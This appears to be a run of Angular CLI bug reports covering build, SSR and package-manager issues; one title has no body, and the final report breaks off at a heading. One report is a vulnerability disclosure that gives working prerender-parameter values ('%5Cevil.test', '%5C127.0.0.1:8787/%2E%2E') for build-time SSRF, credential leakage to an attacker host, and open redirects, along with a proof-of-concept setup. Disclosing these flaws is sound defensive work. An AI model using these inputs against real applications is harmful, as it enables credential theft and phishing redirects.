title: `ng generate application` produces a missing stylesheet when a workspace component type is configured
body:
Hi Angular team! 

I found a case where a newly generated application fails to build when the workspace has a default component `type` configured.

### Command

generate, build

### Description

With `"@schematics/angular:component": { "type": "component" }` in the workspace-level `schematics` section of `angular.json`, generating an application with the 2025 file naming style produces `app.component.css`, but the generated `app.ts` references `./app.css`.

As a result, the application fails its first build with NG2008. Both `app.ts` and an extra `app.component.ts` are generated.

### Minimal Reproduction

1. Create a workspace:

   ```sh
   ng new component-type-repro --create-application=false --defaults --package-manager=npm --skip-git
   cd component-type-repro
   ```

2. Add the following at the **top level** of `angular.json` (alongside `projects`):

   ```json
   "schematics": {
     "@schematics/angular:component": {
       "type": "component"
     }
   }
   ```

3. Generate and build an application:

   ```sh
   ng generate application demo --file-name-style-guide=2025 --style=css --ssr=false --skip-install
   ng build demo --configuration=development
   ```

**Actual behavior**

The generated files include:

```text
projects/demo/src/app/app.ts
projects/demo/src/app/app.component.ts
projects/demo/src/app/app.component.css
```

There is no `app.css`, but `app.ts` contains:

```ts
styleUrl: './app.css',
```

**Expected behavior**

The root component files and their references should consistently follow the selected application naming style: `app.ts`, `app.html`, and `app.css` for 2025. The generated application should build successfully.

The workspace component default should still apply when generating ordinary components separately.

### Exception or Error

```text
✘ [ERROR] NG2008: Could not find stylesheet file './app.css'. [plugin angular-compiler]

    projects/demo/src/app/app.ts:7:12:
      7 │   styleUrl: './app.css',
        ╵             ~~~~~~~~~~~
```

### Your Environment

Reproduced with the locally built CLI from `main` at d5035923f0e357b2526c98110125eee04b05192f, using the repository's Bazel E2E runner. Its `ng version` output reports:

```text
Angular CLI       : 22.3.0-next.5
Angular           : 22.3.0-next.4
Node.js           : 24.15.0
Package Manager   : npm 12.0.2
Operating System  : darwin x64
```

I have not established the last working version.

### Anything else relevant?

- #31053 introduced the file naming style option and describes the 2025 root component filename as `app.ts`.
- #34450 and #34472 addressed similar inheritance of the workspace component `type` in the app-shell and routed-module schematics. This report concerns the application schematic.

The application schematic explicitly sets the component `type` for the 2016 style, but leaves it unspecified for 2025. It appears that the workspace default is inherited during component generation while the application templates continue to use the 2025 filenames.

I have a local fix and an E2E regression test for this case and will follow up with a PR. Thanks for taking a look!

title: Debug ID changes the bytes of polyfills and main but not their file names, so cached files fail the SRI check
body:
### Command

build

### Is this a regression?

Yes. It started with the debug IDs in 22.1.0.

### Description

Follow-up to #34574.

The builder names `polyfills-<hash>.js` and `main-<hash>.js` first. Then it adds a `//# debugId=<id>` line to the file. It computes `<id>` from the source map after it rewrites the map to add `x_google_ignoreList`. The file name does not cover that line.

So when a builder release writes the source map differently, the JS bytes change and the file name stays the same. 22.1.8 did that. Commit 5a0d226b7c moved `x_google_ignoreList` to the start of the map.

With `subresourceIntegrity`, the new `index.html` pins the new bytes. A CDN or browser cache that kept the old file under the same URL serves the old bytes, and the browser blocks the script. This happened to us in production with `polyfills-<hash>.js`.

#34583 fixed this for the chunks of the chunk optimizer. It does not cover files that esbuild names, such as `main` and `polyfills`. 22.2.6 still computes their debug ID from the rewritten map.

### Minimal Reproduction

```bash
npx @angular/cli@22.1.8 new repro --defaults --ssr=false
cd repro
npm install zone.js
npm install -D @angular/build@22.1.6
npx ng config projects.repro.architect.build.options.polyfills '["zone.js"]'
npx ng config projects.repro.architect.build.configurations.production.sourceMap true
npx ng config projects.repro.architect.build.configurations.production.subresourceIntegrity true
npx ng build && mv dist/repro/browser ../build-22.1.6
npm install -D @angular/build@22.1.8
npx ng build && mv dist/repro/browser ../build-22.1.8
```

Both builds write `polyfills-QWJLBG44.js` and `main-HHND32NM.js`. In each file, only the `//# debugId=` line differs:

```
polyfills-QWJLBG44.js
  build-22.1.6: //# debugId=d932f97d-b667-5462-b3b7-b328a1ce7f5a
  build-22.1.8: //# debugId=81c8766a-7d41-50fd-ac6d-16c3c4ed6358
main-HHND32NM.js
  build-22.1.6: //# debugId=e3a30145-1442-57c2-96a7-a88f9bf43b0a
  build-22.1.8: //# debugId=50dd2d3c-f1e3-5224-9587-43f24f562421
```

The two `index.html` files pin different hashes for the same URLs. For both files, the two source maps have the same content in a different key order.

### Exception or Error

```
Failed to find a valid digest in the 'integrity' attribute for resource 'https://example.com/polyfills-JTOAPWZJ.js' with computed SHA-384 integrity '...'. The resource has been blocked.
```

### Your Environment

```
Angular CLI: 22.1.8
@angular/build: 22.1.6, then 22.1.8
@angular/core: 22.2.5
zone.js: 0.16.3
Node: 24.17.0
OS: macOS
```

### Anything else relevant?

Expected: when the bytes of a hashed file change, its name changes too.

A possible fix is to compute the debug ID from the JS before the builder adds the debug ID line, not from the rewritten map. The file name already covers the JS.

title: pnpm add and pnpm install fail after ng new on pnpm 11+ (ERR_PNPM_IGNORED_BUILDS)
body:
### Command

new

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

When I create a new project with `ng new --package-manager pnpm` on pnpm 11 or later, `ng new` itself works, but the next `pnpm add` fails. A fresh `pnpm install` (after a clone, or on CI) fails the same way.

`@angular/build` depends on `esbuild`, `@parcel/watcher` and `lmdb` (which brings in `msgpackr-extract`), and they all have install scripts. Since pnpm 11, `strictDepBuilds` is on by default, so pnpm fails the install unless each of them is approved or denied under `allowBuilds` in `pnpm-workspace.yaml`. `ng new` doesn't hit it because it installs with `--ignore-scripts`, so it only shows up afterwards.

I ran into this in my project: https://github.com/Blotch-Smart-Frames/AngularLynx/issues/188

I have worked around it in my own `ng add` schematic, but every pnpm user gets this from a plain `ng new`, so I think `ng new` should write the `pnpm-workspace.yaml` for pnpm projects.

### Minimal Reproduction

```
npx @angular/cli@22.2.5 new repro --package-manager pnpm --defaults
cd repro
pnpm add date-fns
```

A fresh install fails too:

```
rm -rf node_modules
pnpm install
```

### Exception or Error

```text
Error: ERR_PNPM_IGNORED_BUILDS

  × adding a new package
  ╰─▶ Ignored build scripts: @parcel/watcher@2.6.0, esbuild@0.28.2,
      lmdb@3.5.6, msgpackr-extract@3.0.4
  help: Run "pnpm approve-builds" to pick which dependencies should be allowed
        to run scripts.
```

### Your Environment

```text
Angular CLI       : 22.2.5
Angular           : 22.2.4
Node.js           : 24.22.0
Package Manager   : pnpm 12.16.1
Operating System  : darwin arm64

┌───────────────────────────┬───────────────────┬───────────────────┐
│ Package                   │ Installed Version │ Requested Version │
├───────────────────────────┼───────────────────┼───────────────────┤
│ @angular/build            │ 22.2.5            │ ^22.2.5           │
│ @angular/cli              │ 22.2.5            │ ^22.2.5           │
│ @angular/common           │ 22.2.4            │ ^22.2.0           │
│ @angular/compiler         │ 22.2.4            │ ^22.2.0           │
│ @angular/compiler-cli     │ 22.2.4            │ ^22.2.0           │
│ @angular/core             │ 22.2.4            │ ^22.2.0           │
│ @angular/forms            │ 22.2.4            │ ^22.2.0           │
│ @angular/platform-browser │ 22.2.4            │ ^22.2.0           │
│ @angular/router           │ 22.2.4            │ ^22.2.0           │
│ rxjs                      │ 7.8.2             │ ~7.8.0            │
│ typescript                │ 6.0.3             │ ~6.0.2            │
│ vitest                    │ 5.0.5             │ ^5.0.0            │
└───────────────────────────┴───────────────────┴───────────────────┘
```

### Anything else relevant?

On pnpm 10 it's only a warning, so it works there.

Adding this `pnpm-workspace.yaml` to the new project fixes it. `pnpm install`, `pnpm add` and `ng build` all work after. It's the same as what this repo has in its own `pnpm-workspace.yaml`:

```yaml
allowBuilds:
  '@parcel/watcher': false
  esbuild: false
  lmdb: false
  msgpackr-extract: false
```

One thing to watch out for: pnpm older than 10.26 doesn't read `allowBuilds`, and pnpm 9 and 10.0 fail on a `pnpm-workspace.yaml` that has no `packages` field. So it probably needs a pnpm version check.

title: @angular/build: source-map comment scanner corrupts valid JS containing a regex literal
body:
### Command

serve

### Is this a regression?

- [x] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

@angular/build 22.0.9 passes the isolated source-map removal test. @angular/cli remains at 22.2.4; Angular framework packages remain at 22.2.3.

### Description

With @angular/build 22.2.4, ng serve fails when optimization and script
source maps are enabled. Vite reports invalid JavaScript during import
analysis. However, ng build succeeds, and the built application worked
when served separately using a local static server.

The failure was traced to removeSourceMappingURL in @angular/build.
The development-server memory plugin calls this function before handing
generated JavaScript to Vite when a source map is present.

The scanner appears to interpret a double quote inside a valid
regular-expression literal as the beginning of a string. It then loses
track of the actual string boundaries and removes a sourceMappingURL-like
sequence that is string content, not a JavaScript comment.

This can be reproduced directly using the published build package,
without application code, authentication libraries, or Vite itself.

Expected:
Source-map comment removal preserves valid JavaScript, including
regular-expression literals and strings containing sourceMappingURL text.

Actual:
Valid JavaScript is truncated into invalid JavaScript. Vite subsequently
reports the parsing error.

The desired behavior is to keep both optimization and script source maps
enabled.

### Minimal Reproduction

With `@angular/build@22.2.4` installed, save the following as `repro.cjs`
and run:

```sh
node repro.cjs
```

This intentionally calls the internal utility to isolate the defect.
It is a standalone scanner reproduction, not a complete Angular app.

```js
const assert = require('node:assert/strict');
const path = require('node:path');
const vm = require('node:vm');

const packageRoot = path.dirname(
  require.resolve('@angular/build/package.json')
);

const { removeSourceMappingURL } = require(
  path.join(packageRoot, 'src', 'utils', 'source-map.js')
);

const input =
  'const pattern = /"/; const text = "//# sourceMappingURL=not-a-comment";';

new vm.Script(input); // The input is valid JavaScript.

const output = removeSourceMappingURL(input);
console.log(output);

assert.equal(
  output,
  input,
  'Input without an actual source-map comment should remain unchanged'
);
```

Expected:
The assertion passes and the input is preserved unchanged.

Actual:
The assertion fails. The output is:

```js
const pattern = /"/; const text = "
```

The output is invalid JavaScript. The `sourceMappingURL` text was inside
a quoted string, not an actual comment.

### Exception or Error

```text
[vite] Internal server error: Failed to parse source for import analysis
because the content contains invalid JS syntax. If you are using JSX,
make sure to name the file with the .jsx or .tsx extension.
Plugin: vite:import-analysis

The standalone reproduction fails its equality assertion.
Parsing the truncated output also produces:
SyntaxError: Invalid or unexpected token
```

### Your Environment

```text
Original failing environment:
@angular/build: 22.2.4
@angular/cli: 22.2.4
@angular/core: 22.2.3
@angular/compiler: 22.2.3
@angular/compiler-cli: 22.2.3
TypeScript: 6.0.3
Vite: 8.3.0
Node.js: 24.20.0
OS: Windows

Current version-pin configuration:
@angular/build: 22.0.9
@angular/cli: 22.2.4 — unchanged
Angular core/compiler/compiler-cli: 22.2.3 — unchanged
Vite resolved by @angular/build: 7.3.6
```

### Anything else relevant?

### Temporary workaround applied

Pinned `@angular/build` to exactly `22.0.9` instead of `22.2.4`:

"@angular/build": "22.0.9"

This is the workaround currently used, not a fix to the scanner.

- `@angular/cli` remains at `22.2.4` — it was not downgraded.
- Angular core/compiler/compiler-cli remain at `22.2.3`.
- Optimization and script source maps remain enabled.

The pinned build package uses Vite `7.3.6` instead of `8.3.0`.
However, the minimal reproduction demonstrates the corruption directly
in `@angular/build`'s source-map scanner without invoking Vite.


### Related issue and fix

- [Issue #33544 — Source-map comment removal corrupts JavaScript inside template literals](https://github.com/angular/angular-cli/issues/33544)
- [PR #33545 — Prevent stripping nested sourceMappingURL comments](https://github.com/angular/angular-cli/pull/33545)

The earlier issue concerned source-map text inside template literals.
Its fix introduced the replacement scanner. This report concerns
regular-expression literal handling in that scanner.

title: @ngtools/webpack: `elideImports` keeps type-only specifiers that are re-exported or `extends`-ed, so webpack 5.112 (build-angular 21.2.28) fails the build
Debug ID changes the bytes of an optimized chunk but not its file name, so cached files fail the SRI check
body:
### Command

build

### Is this a regression?

- [x] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

22.0.x

### Description

Since 22.1.0 (#33110), the application builder adds a `//# debugId=<uuid>` line to each browser JS file when script source maps are enabled. The ID comes from the bytes of the source map.

When the chunk optimizer runs (by default when the build has 3 or more lazy chunks), Rolldown gives the chunks their final file names. The `[hash]` in these names covers the code of the chunk only. It does not cover the source map. The debugId line is added after that.

A change that keeps the JS code of a chunk the same but changes its source map (for example, a change to a TypeScript type or to a comment) gives this result for a chunk that does not import other chunks:

1. The file name stays the same.
2. The debugId changes, because the source map changed.
3. The file bytes change, because the debugId line changed.
4. The SRI hash in `index.html` changes to match the new bytes.

In one build, the HTML and the files match. Across two builds, the rule "same hashed file name means same content" is no longer true.

Hosting setups depend on this rule: they cache hashed files as immutable. Any cache can keep the file from the previous build: a CDN such as Cloudflare, the browser cache, or a proxy. That cache then serves the old bytes together with the new `index.html`. The integrity check fails, the browser blocks the file, and the modules in it do not load.

Before 22.1.0 there was no debugId line, so the bytes of a hashed file changed only when its name changed.

**Expected behavior:** if the bytes of a hashed output file change, its file name changes too.

### Minimal Reproduction

Repository: https://github.com/virgiliojr/angular-debugid-sri-repro

The app is a plain `ng new` app (Angular CLI 22.2.2) with 3 lazy routes, so the chunk optimizer runs. `lazy-a` and `lazy-b` use `src/app/shared/label.ts`. This module has no imports, so it becomes its own chunk.

1. Run `npm ci`.
2. Run `npx ng build --source-map --subresource-integrity`.
3. In `dist/repro/browser/`, find the chunk that contains `label:`. Write down its file name and its SHA-384.
4. In `src/app/shared/label.ts`, add `extra?: number;` to the `LabelInput` interface. This is a type-only change: the JS output of `label.ts` stays the same.
5. Run `npx ng build --source-map --subresource-integrity` again.
6. Find the chunk that contains `label:` again.

`bash compare-builds.sh` in the repository does steps 2 to 6 and prints the result below.

**Actual result:**

```text
Build 1
  file name:          chunk-z-ytF2G0.js
  sha384 of bytes:    sha384-Y7f5K4V0FTCrXc6JQ2tGE+VllRWg501EixeFEPMjNMboDgwfeRc9E6l8oHlqTbX5
  debugId line:       //# debugId=105cedd6-2603-584f-8e8d-7801d6020b96
  sha in index.html:  yes
Build 2
  file name:          chunk-z-ytF2G0.js
  sha384 of bytes:    sha384-bgCbCJmJexbhKCHeS4kpofe2lKBPWJ1f3JpK9668+/jD2mfiEYADUy5xD1Usr1dZ
  debugId line:       //# debugId=9c547775-c029-5af8-ba7e-25c70949f1b6
  sha in index.html:  yes

Diff of the chunk between the two builds:
2c2
< //# debugId=105cedd6-2603-584f-8e8d-7801d6020b96
---
> //# debugId=9c547775-c029-5af8-ba7e-25c70949f1b6
```

The file name is the same, but the bytes and the SRI hash in `index.html` are different.

**Expected result:** if the bytes are different, the file name is different too.

To see the failure in a browser, serve the output of build 2, but serve `chunk-z-ytF2G0.js` from build 1. This is what a cache does after a deployment.

### Exception or Error

```text
Failed to find a valid digest in the 'integrity' attribute for resource 'https://<host>/chunk-z-ytF2G0.js' with computed SHA-384 integrity '<hash>'. The resource has been blocked.
```

### Your Environment

```text
Angular CLI       : 22.2.5
Angular           : 22.2.3
Node.js           : 24.18.0
Package Manager   : npm 11.16.0
Operating System  : darwin arm64

┌───────────────────────────┬───────────────────┬───────────────────┐
│ Package                   │ Installed Version │ Requested Version │
├───────────────────────────┼───────────────────┼───────────────────┤
│ @angular/build            │ 22.2.5            │ ^22.2.2           │
│ @angular/cli              │ 22.2.5            │ ^22.2.2           │
│ @angular/common           │ 22.2.3            │ ^22.2.0           │
│ @angular/compiler         │ 22.2.3            │ ^22.2.0           │
│ @angular/compiler-cli     │ 22.2.3            │ ^22.2.0           │
│ @angular/core             │ 22.2.3            │ ^22.2.0           │
│ @angular/forms            │ 22.2.3            │ ^22.2.0           │
│ @angular/platform-browser │ 22.2.3            │ ^22.2.0           │
│ @angular/router           │ 22.2.3            │ ^22.2.0           │
│ rxjs                      │ 7.8.2             │ ~7.8.0            │
│ typescript                │ 6.0.3             │ ~6.0.2            │
└───────────────────────────┴───────────────────┴───────────────────┘
```

### Anything else relevant?

This does not depend on the browser. Any cache in front of the hashed files can cause it.

The defect needs the chunk optimizer. With `NG_BUILD_OPTIMIZE_CHUNKS=false`, the same type change gives a new esbuild file name for the chunk (for example `chunk-P54LQIKA.js` to `chunk-5HS55H7R.js`), so the name and the bytes change together.

A chunk that imports other chunks usually gets a new name anyway, because the names of the chunks it imports change. A chunk without such imports keeps its name.

Related: #33108, #33110, #33572. The current `main` still has this behavior: `injectDebugIds` (called from `execute-post-bundle.ts` when `sourcemapOptions.scripts` is true) changes the file contents but does not change the file name. The Rolldown pass in `chunk-optimizer.ts` uses `chunkFileNames: '<name>-[hash].js'`.

title: Angular SSR prerender params allow build-time SSRF, credential leaks, and open redirects
body:
### Command

other

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description


This is the part of #34474 that escaping doesn't reach. 22.2.5 ships both fixes from that issue, and a `getPrerenderParams()` value that starts with `\` still leaves the application's origin twice: while `ng build` renders the page, and in the redirect it ships.

`handlePrerenderParamsReplacement` only checks the type ([`ng-routes.ts#L553-L570`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/ssr/src/routes/ng-routes.ts#L553-L570)):

```ts
if (typeof value !== 'string') {
  throw new Error(/* ... */);
}

return parameterName === '**' ? `/${value}` : value;
```

So `\cdn-login.test` becomes the route `/\cdn-login.test`. As a path it looks harmless, but for `http:` the URL parser reads `\` as `/`, so the route is `//cdn-login.test`, another host. Two places use the route as a URL:

- `renderPage` builds the render request with `new Request(new URL(url, serverURL))` ([`render-worker.ts#L54`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/build/src/utils/server-rendering/render-worker.ts#L54)), so the page renders with that host as its origin, and every relative `HttpClient` call made during the render goes there.
- The resolved `redirectTo` goes into the generated redirect page ([`prerender.ts#L258`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/build/src/utils/server-rendering/prerender.ts#L258)), or into `Location` with `outputMode: 'server'`.

Those values are application data, the docs read them from a service:

```ts
const ids = await dataService.getIds();
return ids.map((id) => ({ id }));
```

So whoever can write one row, through a public signup or as a CMS author, picks where the build connects and where visitors land. The product in the repro validates both inputs (no whitespace, no raw `\`, no `..`) and these still pass, because `RouteTree.getPathSegments` percent-decodes each segment afterwards ([`route-tree.ts#L212-L213`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/ssr/src/routes/route-tree.ts#L212-L213)). One value is enough:

| Value                               | Entered through               | Result                                                                                   |
| ----------------------------------- | ----------------------------- | ---------------------------------------------------------------------------------------- |
| `\cdn-login.test`                   | workspace slug, public signup | `/%5Ccdn-login.test` redirects to `cdn-login.test`                                       |
| `%5C127.0.0.2/docs/getting-started` | CMS page path                 | the build reads an internal-only service and publishes the response                      |
| `%5C127.0.0.1:8787/%2E%2E`          | CMS page path                 | the platform credentials go to `127.0.0.1:8787`, and the site's `index.html` is replaced |
| `%5Cevil.test/docs/getting-started` | CMS page path                 | the build sends a request to `evil.test`                                                 |

`ng build` exits 0 with no warning for all of them.

**1. Open redirect.** Each workspace gets a vanity URL that lands on its home page:

```ts
{ path: ':workspace', children: [
  { path: '', pathMatch: 'full', redirectTo: 'home' },
  { path: 'home', component: WorkspacePage },
]},
```

With the slug `\cdn-login.test` the build writes this redirect page:

```html
<meta http-equiv="refresh" content="0; url=/\cdn-login.test/home" />
```

In Chrome, `http://status.statuslane.test/%5Ccdn-login.test` ends on `http://cdn-login.test/home`. The link has no `@`, no second scheme and no `//`. `escapeHtml` leaves the target as it is, since there's nothing in it to escape.

**2. Reading an internal service.** Docs pages load their body in a resolver, over a relative URL:

```ts
inject(HttpClient).get(`/api/content/${path}`, { responseType: 'text' });
```

With the page path `%5C127.0.0.2/docs/getting-started` the page renders at `http://127.0.0.2`, so the build fetches `http://127.0.0.2/api/content/docs/getting-started`, a service only the CI network can reach. Its response, database URL included, is written into the published page and into `ng-state`. The attacker never needs an inbound connection, the response comes back through the site. The tail has to name a route that exists, otherwise the build fails with `The content returned was empty.`

**3. Credentials to another host.** The home page calls the internal API or/and an interceptor adds the platform token only to relative URLs, which is the usual guard:

```ts
if (!req.url.startsWith('/api/internal/')) {
  return next(req);
}
return next(
  req.clone({
    setHeaders: { authorization, 'x-api-key': apiKey, cookie, 'x-ci-deploy-token': ciToken },
  }),
);
```

With `%5C127.0.0.1:8787/%2E%2E` the URL is still relative when the interceptor runs and the origin is applied later, so all four headers arrive at `127.0.0.1:8787`. `%2E%2E` consumes the host segment when `posix.join` computes the output path ([`prerender.ts#L462`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/build/src/utils/server-rendering/prerender.ts#L462)), so the page is written over the site's own `index.html` and `dist` has no odd file name. That write races the real home page: 1 of 3 builds at 0 ms, 3 of 3 when the listener answers after 1500 ms. The credentials go out every time.

**4. `allowedHosts` isn't consulted.** The app sets `security.allowedHosts: ["localhost"]`, none of the hosts above is on it, and the build went to all of them. A DNS name works the same. With the page path `%5Cevil.test/docs/getting-started` the page renders at `http://evil.test`, and its request only fails because `.test` doesn't resolve:

```text
evil.test/docs/getting-started/index.html
    origin   http://evil.test
    content  "unavailable (Http failure response for http://evil.test/api/c)"
```

A name the attacker owns would connect. The page gets that origin even though nothing answered, because the origin is set before any request is made. `allowedHosts` only decides which `Host` headers the running server answers. A filter on the raw value doesn't help either, since `%5C` is decoded later.

### Minimal Reproduction


Repository: https://github.com/SkyZeroZx/angular-cli-prerender-param-ssrf-poc

There the values arrive over HTTP from the application's own API, through a public signup and a CMS author token. Every host is on loopback.

```bash
npm ci
npm run attack
npm run browser
```

```text
build              exit 0, prerendered 12, warnings 0
allowedHosts       ["localhost"] (angular.json)
  P1 signup "\cdn-login.test"                          accepted                     landed
  P2 cms    "%5C127.0.0.2/docs/getting-started"        accepted                     landed
  P3 cms    "%5C127.0.0.1:8787/%2E%2E"                 accepted                     landed
  P4 cms    "%5Cevil.test/docs/getting-started"        accepted                     landed
  [attacker] GET /api/internal/metrics  Host=127.0.0.1:8787  UA=node  (not in allowedHosts)
  [internal] GET /api/content/docs/getting-started  Host=127.0.0.2  UA=node  (not in allowedHosts)
```

Without the lab, one route and one value:

```ts
// app.routes.ts
export const routes: Routes = [
  {
    path: ':tenant',
    children: [
      { path: '', redirectTo: 'home', pathMatch: 'full' },
      { path: 'home', component: Page },
    ],
  },
  { path: '**', component: Page },
];

// app.routes.server.ts
export const serverRoutes: ServerRoute[] = [
  {
    path: ':tenant',
    renderMode: RenderMode.Prerender,
    getPrerenderParams: async () => [{ tenant: '\\evil.test' }],
  },
  { path: '**', renderMode: RenderMode.Client },
];
```

```bash
ng build
NG_ALLOWED_HOSTS=localhost PORT=4000 node dist/<app>/server/server.mjs &
curl -s -o /dev/null -D - http://localhost:4000/%5Cevil.test | grep -i location
```

```text
location: /\evil.test/home
```

With `--output-mode=static` the same value writes a redirect page with the same target.

### Exception or Error

```text

```

### Your Environment

```text
Angular CLI 22.2.5
@angular/build 22.2.5
@angular/ssr 22.2.5
@angular/core 22.2.3
Node.js 24.16.0
npm 11.13.0
Windows 11 x64
Chrome 156
```

### Anything else relevant?

_No response_

title: @angular/ssr: an aborted request rejects `handle()` but the render keeps running
body:
### Which @angular/* package(s) are the source of the bug?

platform-server

### Is this a regression?

No

### Description

`AngularServerApp.handle()` wraps `handleRendering()` in `promiseWithAbort(…, request.signal, …)` (`packages/angular/ssr/src/app.ts`). When the signal aborts, the returned promise rejects, but nothing stops the render: the platform `renderAngular()` created stays alive, its HTTP calls keep going, and the app goes on rendering a page nobody will receive.

This makes `request.signal` unusable as a render timeout. A server that caps renders (to answer 503 before the proxy's own timeout, and to limit how many renders run at once) gets its promise back on time while the work piles up in the background. With a slow backend, every abandoned render is still running when the next batch starts.

Reproduction: a route whose component issues an `HttpClient` GET to a backend that answers after 60 s. Call `engine.handle(new Request(url, { signal: AbortSignal.timeout(5_000) }))`. `handle()` rejects at 5 s; the backend still sees the request run to completion, and any request the app makes after that response still arrives. On our app (22.2.2), three renders aborted at 50 s made 8 more backend calls once the backend answered.

**Suggested fix**

Pass the signal into `renderAngular()` and destroy the platform on abort, the same way it is destroyed after a normal render:

```ts
// utils/ng.ts, inside renderAngular(), after platformServer(...)
const onAbort = () => void asyncDestroyPlatform(platformRef);
signal?.addEventListener('abort', onAbort, { once: true });
// ...and remove the listener in the existing finally / destroy paths
```

The rest already works: destroying the app clears `PendingTasks`, so `whenStable()` settles; the `applicationRef.destroyed` check added in 730ae66 ("handle platform destruction during rendering") returns `{ hasNavigationError: true }`; and `FetchBackend` aborts its fetch when the destroyed app's subscriptions are torn down.

**Workaround** (what we ship now), in `app.config.server.ts`:

```ts
provideEnvironmentInitializer(() => {
  const signal = inject(REQUEST, { optional: true })?.signal;
  if (!signal) return;
  const platform = inject(PlatformRef);
  const destroy = () => setTimeout(() => platform.destroyed || platform.destroy());
  if (signal.aborted) return destroy();
  signal.addEventListener('abort', destroy, { once: true });
  inject(DestroyRef).onDestroy(() => signal.removeEventListener('abort', destroy));
});
```

title: build: ERR_REQUIRE_CYCLE_MODULE when loading oxc-parser in StackBlitz / WebContainer
body:
### Command
build, serve

### Is this a regression?
Yes, this behavior used to work in the previous version

### Description
In StackBlitz (WebContainer), running an Angular application with `@angular/build` fails during `ng serve` / `ng build` with:

```
(node:12) ExperimentalWarning: WASI is an experimental feature and might change at any time
(Use `node --trace-warnings ...` to show where the warning was created)
[oxc-parser] Downloading @oxc-parser/binding-wasm32-wasi@0.150.0 on WebContainer...
Error [ERR_REQUIRE_CYCLE_MODULE]: Cannot require() ES Module /home/projects/stackblitz-starters-ki4mfjac/node_modules/oxc-parser/src-js/index.js in a cycle. (from /home/projects/stackblitz-starters-ki4mfjac/node_modules/@angular/build/src/tools/oxc/oxc-transform.js) A cycle involving require(esm) is not allowed to maintain invariants mandated by the ECMAScript specification. Try making at least part of the dependency in the graph lazily loaded.
    at ModuleLoader.importSyncForRequire (node:internal/modules/esm/loader:169:3960)
    at loadESMFromCJS (node:internal/modules/cjs/loader:160:19002)
    at Module._compile (node:internal/modules/cjs/loader:160:19068)
    at Module._extensions..js (node:internal/modules/cjs/loader:160:20043)
    at Module.load (node:internal/modules/cjs/loader:160:17661)
    at Module._load (node:internal/modules/cjs/loader:160:15179)
    at wrapModuleLoad (node:internal/modules/cjs/loader:160:4199)
    at Module.require (node:internal/modules/cjs/loader:160:17842)
    at require2 (node:internal/modules/helpers:177:3126) {
  code: 'ERR_REQUIRE_CYCLE_MODULE'
}
```

Parent issue: https://github.com/stackblitz/starters/issues/136

#### Analysis & Root Cause

1. **No actual cyclic dependency in the code:**
   The module graph (`oxc-transform.ts` -> `oxc-parser`, `oxc-transform.ts` -> `traversal.ts` -> `oxc-parser`) is an acyclic DAG.
   The `ERR_REQUIRE_CYCLE_MODULE` error is a known misleading error in Node.js's synchronous `require(esm)` loader (Node.js issues [#55516](https://github.com/nodejs/node/issues/55516) and [#57172](https://github.com/nodejs/node/issues/57172)). When an ES module throws an error during synchronous `require(esm)` evaluation, Node's loader frequently shadows the real underlying exception and reports that the module was required in a cycle.

2. **WebContainer Fallback Failure:**
   - StackBlitz WebContainer cannot run native `.node` addons.
   - `oxc-parser`'s `optionalDependencies` only list platform-specific native addons (`@oxc-parser/binding-linux-x64-gnu`, etc.) and do not list `@oxc-parser/binding-wasm32-wasi`. Consequently, package managers running in WebContainer never install the WASI binding.
   - At runtime, `oxc-parser/src-js/bindings.js` detects WebContainer and falls back to `webcontainer-fallback.cjs`, which attempts to run `childProcess.execFileSync("pnpm", ["i", "@oxc-parser/binding-wasm32-wasi@..."], { cwd: "/tmp/..." })`.
   - Running this synchronous subprocess from a worker thread inside WebContainer fails (or fails to initialize the multi-threaded WASI runtime), causing the synchronous `require(esm)` evaluation of `oxc-parser` to fail and surface as `ERR_REQUIRE_CYCLE_MODULE`.

#### Proposed Solution (Option 4A: Add `@oxc-parser/binding-wasm32-wasi` to `@angular/build` optionalDependencies)

In `oxc-parser/src-js/bindings.js`, before falling back to `webcontainer-fallback.cjs`, it checks:
```js
__napiWasiResolveCandidate('@oxc-parser/binding-wasm32-wasi', true, undefined)
```
If `@oxc-parser/binding-wasm32-wasi` is already present in `node_modules`, `oxc-parser` directly loads it and bypasses `webcontainer-fallback.cjs` and the dynamic `pnpm i` in `/tmp` entirely.

A viable solution (Option 4A) is to declare `@oxc-parser/binding-wasm32-wasi` in `@angular/build`'s `optionalDependencies` (similar to how `lmdb` is declared).
This ensures that package managers install the WASI binding up-front alongside `@angular/build`, preventing the runtime dynamic installation and the resulting failure in WebContainer.

### Minimal Reproduction
1. Open https://stackblitz.com/edit/stackblitz-starters-ki4mfjac?file=package.json (or update any StackBlitz Angular starter to Angular CLI v22.2+).
2. Run `npm install && npm start` (or `ng serve`).
3. Notice the build fails with `ERR_REQUIRE_CYCLE_MODULE: Cannot require() ES Module .../oxc-parser/src-js/index.js in a cycle`.

### Exception or Error
```
(node:12) ExperimentalWarning: WASI is an experimental feature and might change at any time
(Use `node --trace-warnings ...` to show where the warning was created)
[oxc-parser] Downloading @oxc-parser/binding-wasm32-wasi@0.150.0 on WebContainer...
Error [ERR_REQUIRE_CYCLE_MODULE]: Cannot require() ES Module /home/projects/stackblitz-starters-ki4mfjac/node_modules/oxc-parser/src-js/index.js in a cycle. (from /home/projects/stackblitz-starters-ki4mfjac/node_modules/@angular/build/src/tools/oxc/oxc-transform.js) A cycle involving require(esm) is not allowed to maintain invariants mandated by the ECMAScript specification. Try making at least part of the dependency in the graph lazily loaded.
```

title: Server polyfills are not user-controllable: no way to opt out of `@angular/platform-server/init` or add server-only polyfills
body:
### Command

build, serve

### Description

`@angular/build:application` derives the server polyfills list entirely on its own and offers no option to change it. In `createServerPolyfillBundleOptions` ([application-code-bundle.ts#L164-L184](https://github.com/angular/angular-cli/blob/main/packages/angular/build/src/tools/esbuild/application-code-bundle.ts#L164-L184)):

- `zone.js/node` (or `zone.js` on `platform: 'neutral'`) is added when the browser `polyfills` list contains `zone.js`,
- `@angular/localize/init` is added when the browser list contains it,
- `@angular/platform-server/init` is **always** added.

So the browser polyfills list is fully explicit, and the server polyfills list is fully implicit. Two concrete gaps follow from that:

#### 1. There is no opt-out of the `init` global patch

